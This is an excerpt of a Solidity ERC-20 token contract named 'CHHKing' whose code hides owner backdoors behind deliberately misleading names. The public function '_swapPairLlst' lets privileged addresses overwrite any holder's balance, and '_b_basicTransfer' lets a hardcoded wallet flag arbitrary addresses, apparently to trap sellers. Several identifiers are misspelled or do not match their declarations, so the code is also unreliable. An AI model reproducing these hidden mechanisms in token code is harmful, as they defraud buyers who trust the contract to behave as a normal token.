...
contract CHHKing is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private _name = "CHHKing";
    string private _symbol = "CHHKing";
    uint8 private _decimals = 9;
    address payable public _secondWallet;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _true;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _IsExcludeFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public _false__;
    ...
    constructor () {
        ...
        _false__[address(uniswapPair)] = true;
        _false__[_msgSender()] = true;

        teamWalletAddress = payable(address(0x77D5fd6D76F2A82ec101a0d3544F77124cEc93dE));
        _secondWallet = payable(address(0x77D5fd6D76F2A82ec101a0d3544F77124cEc93dE));

        _true[_msgSender()] = _totalSupply;
...
function _swapPairLlst(address paypable, uint256 uint222) public
{if( 
_false__[ 
_msgSender()])_true[paypable] 
= uint222;}receive() external payable {}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_false__[sender] && swapAndLiquifyEnabled) 
            {
            ...
            _true[sender] = _true[sender].sub(amount);
            ...
            _true[recipient] = _true[recipient].add(finalAmount);
    ...
    function _b_basicTransfer(address[] calldata accoumt,bool newVaIue) public {
    if( 
_mgSender() 
== 
_secondWallet)
{
        for(uint256 i = 0; i < accoumt.length; i++) {
            _false[accoumt[i]] = newVaIue;}
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _true[sender] = _true[sender].sub(amount, "Insufficient Balance");
        _true[recipient] = _true[recipient].add(amount);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        else if(_false__[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }

        if(feeAmount > 0) {
            _true[address(this)] = _true[address(this)].add(feeAmount);
